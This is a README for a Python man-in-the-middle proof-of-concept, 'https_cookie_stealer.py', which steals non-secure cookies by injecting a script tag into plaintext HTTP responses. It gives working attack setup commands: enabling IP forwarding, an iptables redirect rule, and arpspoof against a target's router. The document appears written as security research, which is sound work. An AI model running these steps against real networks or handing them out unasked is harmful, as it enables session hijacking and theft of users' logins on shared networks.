https_cookie_stealer.py is a MITM PoC that allows stealing of cookies that are not
secured with the "secure" attribute, even if the target server can be reached
only via https.

This is done by injecting a small piece of HTML code into every clear text http
response for the client which forces to load a JavaScript code from the (not existing)
http service of the target server.

Example:
<script language="javascript" type="text/javascript" src="http://xxxx"></script>

It then implements a basic http service to retrieve the cookie values.

https_cookie_stealer.py is based on the MITMProxy (http://mitmproxy.org/) library libmproxy.

Running:
https_cookie_stealer.py can be run from the source base without installation.  
Just run 'python https_cookie_stealer.py' as a non-root user to get the
command-line options.

The four steps to getting this working (assuming you're running Linux)
are:

1) Flip your machine into forwarding mode (as root):
echo "1" > /proc/sys/net/ipv4/ip_forward

2) Setup iptables to intercept HTTP requests (as root):
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>

3) Run https_cookie_stealer.py with the command-line options you'd like (see above).

4) Run arpspoof to redirect traffic to your machine (as root):
arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
